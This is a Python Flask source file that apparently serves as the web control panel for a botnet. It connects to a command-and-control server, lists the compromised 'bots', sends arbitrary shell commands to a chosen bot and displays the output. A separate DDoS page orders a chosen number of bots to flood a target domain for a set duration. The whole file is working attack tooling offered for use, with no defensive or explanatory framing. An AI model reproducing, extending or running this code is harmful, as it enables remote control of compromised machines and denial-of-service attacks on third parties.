#!/usr/bin/env python

from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
from socket import error
import os
import socket
import sys

app = Flask(__name__)
connection_err = 'Failed to connect to the server'
insert_err = 'Check if ip and port are correct'

@app.route('/')
def home():
    if not session.get('logged_in'):
        return redirect(url_for('access'))
    else:
        return redirect(url_for('main_activity'))
 
@app.route('/access', methods=['GET','POST'])
def access():
    if request.method == 'POST':
        global connection_error
        server_ip = request.form.get('server_ip')
        server_port = request.form.get('server_port')
        if not server_ip or not server_port or int(server_port) not in range(1,65535):
            return render_template('access.html', error = insert_err)
        #Try enstablish connection to the server
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((server_ip, int(server_port)))
            session['logged_in'] = True
            session['ip'] = server_ip
            session['port'] = int(server_port)
            return redirect(url_for('main_activity'))
        except socket.timeout as err:
            print('[DEBUG] Timeout error | reason: %s' %(err))
            return render_template('access.html', error = connection_err)
        except error as serr:
            return render_template('access.html', error = connection_err)

    if request.method == 'GET':
        return render_template('access.html')

#This is the main activity page, get all bots connected to the main server
@app.route('/main_activity', methods=['GET','POST'])
def main_activity():
    if request.method == 'POST':
        if request.form['submit'] == 'ACCESS':
            req = request.form.get('access')
            print('[DEBUG] ip selected: %s' %(req))
            return redirect(url_for('peer_activity', ip = req))
        
        elif request.form['submit'] == 'DDOS':
            return redirect(url_for('ddos_setup'))
    
    if request.method == 'GET':
        if not session.get('logged_in'):
            return redirect(url_for('home'))
        else: 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ip = session.get('ip')
            port = session.get('port')
            sock.connect((ip, port))
            sock.send("*".encode('utf-8'))
            data_b = sock.recv(4096)
            sock.close()
            data = data_b.decode('utf-8')
            ip_data = data.split('*')
            session['cnt_peers'] = len(ip_data)
            print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
            #print('[DEBUG] Status [%d]' %(session['cnt_peers']))
            return render_template('main_activity.html', ip_list = ip_data)

#User activity, get information from the bot you are connected#
@app.route('/peer_activity/<ip>', methods=['GET','POST'])
def peer_activity(ip):
    if request.method == 'POST':
        if request.form['submit'] == 'SEND COMMAND':
            cmd = request.form.get('cmd_text')
            host = request.form.get("host")
            if cmd == '':
                return render_template('peer_activity.html', ip = ip)
            server_ip = session.get('ip')
            server_port = session.get('port')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))
            sock.settimeout(5)
            srv_msg = "*".join(['CMD', host, cmd])
            sock.send(srv_msg.encode('utf-8'))
            print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
            try:
                resp = sock.recv(4096)
            except socket.timeout as err:
                return render_template('peer_activity.html', ip = ip)
            sock.close()
            #TODO Check  resp format
            resp = resp.decode('utf-8')
            resp = resp.replace('\n', '<br>')
            print("[DEBUG] Response from Server: %s" %resp)
            if resp:
                return render_template('peer_activity.html', ip = ip, cmd_response = resp)
            else:
                return redirect(url_for('peer_activity.html', ip = ip))

        elif request.form['submit'] == '<==':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        return render_template('peer_activity.html', ip = ip)

#ddos_setup, setup for a ddos attack
@app.route('/ddos_setup', methods=['GET','POST'])
def ddos_setup():
    if request.method == 'POST':
        if request.form['submit'] == 'START':
            n_peers = request.form.get('range')
            time = request.form.get('time')
            host = request.form.get('domain')
            if 'http' in host:
                host = host.split('/')[2]
            msg = '*'.join(['DDOS', n_peers, time, host])
            ip = session.get('ip')
            port = session.get('port')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(msg.encode('utf-8'))
            return redirect(url_for('main_activity'))

        elif request.form['submit'] == '<==':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        cnt_peers = session.get('cnt_peers')
        print(cnt_peers)
        return render_template('ddos_setup.html', n_peers = cnt_peers)

if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.debug=True
    app.run()
